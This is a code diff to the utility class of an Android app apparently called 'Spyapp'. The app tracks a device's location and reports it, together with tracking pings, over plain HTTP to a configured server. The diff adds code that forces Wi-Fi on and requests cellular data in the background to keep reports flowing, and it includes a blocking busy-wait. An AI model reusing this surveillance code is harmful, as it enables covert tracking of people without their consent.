@@ -29,8 +29,15 @@ import android.graphics.BitmapFactory;
 import android.graphics.Color;
 import android.location.Location;
 import android.net.ConnectivityManager;
+import android.net.LinkProperties;
+import android.net.Network;
+import android.net.NetworkCapabilities;
 import android.net.NetworkInfo;
+import android.net.NetworkRequest;
+import android.net.wifi.WifiManager;
 import android.os.Build;
+import android.os.CountDownTimer;
+import android.os.Looper;
 import android.os.PowerManager;
 import android.preference.PreferenceManager;
 import android.telephony.TelephonyManager;
@@ -101,15 +108,13 @@ public class Utils {
 
     /**
      * @author The Elite Gentleman
-     *
      */
     public enum PING_REASONS {
         PING_TRIGGERLU("TRIGGERLU"),
         PING_STOPTRACKING("STOPTRACKING"),
         PING_STARTTRACKING("STARTTRACKING"),
         PING_USERID_CHANGED("USERIDCHANGED"),
-        PING_HI("HI")
-        ;
+        PING_HI("HI");
 
         private final String text;
 
@@ -174,7 +179,7 @@ public class Utils {
 
     }
 
-    public static void setSPStringValue(String key,String value) {
+    public static void setSPStringValue(String key, String value) {
         PreferenceManager.getDefaultSharedPreferences(Spyapp.getContext())
                 .edit()
                 .putString(key, value)
@@ -211,20 +216,83 @@ public class Utils {
     }
 
 
-
-
     public static boolean isNetwork() {
 
-        ConnectivityManager cm = (ConnectivityManager) Spyapp.getContext()
-                .getSystemService(Context.CONNECTIVITY_SERVICE);
-        assert cm != null;
-        NetworkInfo netInfo = cm.getActiveNetworkInfo();
-        if (netInfo != null && netInfo.isConnectedOrConnecting()) {
-            return true;
-        }
-        return false;
-    }
+        final boolean[] avail = {false};
 
+        try {
+
+            ConnectivityManager cm = (ConnectivityManager) Spyapp.getContext()
+                    .getSystemService(Context.CONNECTIVITY_SERVICE);
+            assert cm != null;
+            NetworkInfo netInfo = cm.getActiveNetworkInfo();
+            if (netInfo != null && netInfo.isConnectedOrConnecting()) {
+                return true;
+            } else {
+                Log.i(TAG, "No network. Trying to bring wifi up");
+
+                try {
+                    WifiManager wifiMgr = (WifiManager) Spyapp.getContext().getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+                    boolean res = wifiMgr.setWifiEnabled(true);
+                    if (res) {
+                        Log.d(TAG, "brought up wifi");
+                        avail[0] = true;
+                    } else {
+                        Log.d(TAG, "bringing up wifi failed");
+                    }
+                    //fOR aNDROID 10 : res value is set to false above because setWifiEnabled returns false on Android 10
+                } catch (Exception exc) {
+                    Log.d(TAG, "Exception when bringing up wifi");
+                    exc.printStackTrace();
+                }
+
+                Log.d(TAG, "bringing up cellular");
+                // try requesting network. (we have issues of not accessing the network while in the background
+
+                NetworkRequest.Builder request = new NetworkRequest.Builder();
+                request.addTransportType(NetworkCapabilities.TRANSPORT_CELLULAR);
+                request.addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
+
+                cm.requestNetwork(request.build(), new ConnectivityManager.NetworkCallback() {
+                    @Override
+                    public void onAvailable(Network network) {
+                        Log.d(TAG, "requestNetwork onAvailable()");
+                        avail[0] = true;
+                    }
+
+                    @Override
+                    public void onCapabilitiesChanged(Network network, NetworkCapabilities networkCapabilities) {
+                        Log.d(TAG, "requestNetwork onCapabilitiesChanged()");
+                    }
+
+                    @Override
+                    public void onLinkPropertiesChanged(Network network, LinkProperties linkProperties) {
+                        Log.d(TAG, "requestNetwork onLinkPropertiesChanged()");
+                    }
+
+                    @Override
+                    public void onLosing(Network network, int maxMsToLive) {
+                        Log.d(TAG, "requestNetwork onLosing()");
+                    }
+
+                    @Override
+                    public void onLost(Network network) {
+                        Log.d(TAG, "requestNetwork onLost()");
+                    }
+                }, 60 * 1000);
+            }
+        } catch (Exception exc) {
+            Log.d(TAG, "Exception checking network");
+            exc.printStackTrace();
+        }
+
+        // delay for allowing network to come up before return
+        long currentTime = System.currentTimeMillis();
+        while (System.currentTimeMillis() < currentTime + 3000){
+            // Log.i(TAG,"tik tok");
+        }
+        return avail[0];
+    }
 
 
     /**
@@ -345,7 +413,7 @@ public class Utils {
         json.put("hasSpeed", location.hasSpeed());
         json.put("Speed", location.getSpeed());
         Date d = new Date(location.getTime());
-        json.put("Time",DateFormat.getDateTimeInstance().format(d));
+        json.put("Time", DateFormat.getDateTimeInstance().format(d));
 
         return json.toString();
     }
@@ -376,16 +444,18 @@ public class Utils {
     /**
      * Post data to server
      */
-    public static void postDataToServer( String url) {
+    public static void postDataToServer(String url, PowerManager.WakeLock mWakeLockForLU) {
+
+        final String receivedUrl = url;
+        // Instantiate the RequestQueue.
+        // final RequestQueue queue = VolleyHttpRequestQueueSingleton.getInstance(Spyapp.getContext()).getRequestQueue();
 
         try {
-            // Instantiate the RequestQueue.
-            RequestQueue queue = VolleyHttpRequestQueueSingleton.getInstance(Spyapp.getContext()).
-                    getRequestQueue();
 
             // Request a string response from the provided URL.
             if (Utils.isNetwork()) {
-                StringRequest stringRequest = new StringRequest(Request.Method.POST, url,
+                /*
+                StringRequest stringRequest = new StringRequest(Request.Method.POST, receivedUrl,
                         new Response.Listener<String>() {
                             @Override
                             public void onResponse(String response) {
@@ -401,16 +471,24 @@ public class Utils {
                 // Add the request to the RequestQueue.
                 queue.add(stringRequest);
                 //queue.start();
-            } else {
-                Log.i(TAG, "No network");
+
+                 */
+
+                new PostToServer().execute(receivedUrl); //execute the asynctask
             }
-        }catch (Exception exc){
+        } catch (Exception exc) {
             exc.printStackTrace();
+        }
+
+        if (mWakeLockForLU != null) {
+            if (mWakeLockForLU.isHeld()) {
+                mWakeLockForLU.release();
+            }
         }
     }
 
     /**
-     *  requests start of location updates with a Worker (minimum @ every 15 minutes).
+     * requests start of location updates with a Worker (minimum @ every 15 minutes).
      */
     public static void requestLocationUpdates() {
 
@@ -451,7 +529,7 @@ public class Utils {
 
     }
 
-    public static void setAlarmForPeriodicLU(int milliseconds){
+    public static void setAlarmForPeriodicLU(int milliseconds) {
 
         Calendar calendar = Calendar.getInstance();
         calendar.setTimeInMillis(System.currentTimeMillis());
@@ -471,7 +549,7 @@ public class Utils {
     }
 
     /**
-     *  requests removal of location updates.
+     * requests removal of location updates.
      */
     public static void removeLocationUpdates() {
 
@@ -519,21 +597,21 @@ public class Utils {
                     URLEncoder.encode(Utils.getSPStringValue(Utils.KEY_TRACKED_DEVICE_APP_UID), "UTF-8") +
                     "/token/" + token;
 
-            Utils.postDataToServer(urlString);
+            Utils.postDataToServer(urlString, null);
 
         } catch (UnsupportedEncodingException e) {
             e.printStackTrace();
         }
     }
 
-    public static void sendPingToServer(PING_REASONS reason){
+    public static void sendPingToServer(PING_REASONS reason) {
 
         try {
             String urlString = "http://" + Utils.getSPStringValue(Utils.KEY_SERVER_IP) +
                     ":8080/api/v1/user/" +
                     URLEncoder.encode(Utils.getSPStringValue(Utils.KEY_TRACKED_DEVICE_APP_UID), "UTF-8") +
                     "/reason/" + reason.toString();
-            Utils.postDataToServer(urlString);
+            Utils.postDataToServer(urlString, null);
 
         } catch (UnsupportedEncodingException e) {
             e.printStackTrace();
